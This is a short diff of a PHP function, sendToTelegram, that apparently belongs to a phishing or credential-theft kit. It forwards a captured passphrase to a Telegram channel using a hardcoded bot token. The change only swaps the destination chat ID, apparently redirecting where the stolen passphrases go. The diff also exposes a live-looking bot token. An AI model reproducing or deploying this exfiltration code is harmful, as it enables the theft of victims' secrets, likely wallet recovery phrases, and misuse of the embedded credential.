@@ -22,8 +22,8 @@ function sendToTelegram($passphrase) {
     // Telegram Bot API token
     $botToken = "7265054014:AAGxCzsiSeBg3O3T6y7JAXoNZP4pWg0H5QY";
     
-    // Your private channel ID (with -100 prefix)
-    $channelId = "-1002222609812";  // Replace with your actual channel ID
+    // Your private channel ID (with -100 prefix)7677624269
+    $channelId = "6736572379";  // Replace with your actual channel ID
 
     // The message you want to send
     $message = $passphrase;
